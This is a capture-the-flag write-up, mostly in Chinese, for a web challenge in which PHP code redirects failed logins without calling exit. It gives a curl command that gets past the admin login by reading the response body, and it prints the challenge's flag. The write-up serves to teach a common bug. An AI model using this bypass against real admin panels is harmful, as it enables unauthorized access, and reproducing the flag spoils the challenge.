# PHM #26 Web — login as admin 4

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 70 |

## 題目

> Just login as admin. Easy, right?
>
> 連結: [`/login4/`](https://ctf.hackme.quest/login4/)

## 分析

Source:

```php
if($_POST['name'] === 'admin') {
    if($_POST['password'] !== $password) {
        header('Location: ./?failed=1');     // ← 忘了 exit!
    }
}
?>
...
<?php if($_POST['name'] === 'admin'): /* login success! */ ?>
    <div class="alert alert-success"><code><?=$flag?></code></div>
<?php else: ?>
    <form>...</form>
<?php endif; ?>
```

`header('Location: ...')` **只送 header, PHP 繼續執行**. 瀏覽器會 follow redirect 但 response body (含 flag) 已經被產生並送出. 用 curl **預設不 follow redirect**, 直接看 body 就拿到 flag.

## 解法

```bash
curl 'https://ctf.hackme.quest/login4/' \
  --data-urlencode 'name=admin' \
  --data-urlencode 'password=anything'
# → Location: ./?failed=1 (header)
# → body 內: <code>FLAG{...}</code>
```

## Flag

```
FLAG{Remember add exit after redirection..}
```

## 感想

超經典新手坑: `header('Location: ...')` 後面必須接 `exit;`, 否則 PHP 繼續跑剩下的程式碼. 很多 PHP admin panel 的驗證 bypass 都是這個模式.

Browser 會自動 follow redirect 讓你看不到 body, 所以用 Chrome DevTools debug 很難發現. 工具角度: `curl` 預設不 follow 反而幫忙暴露 bug.
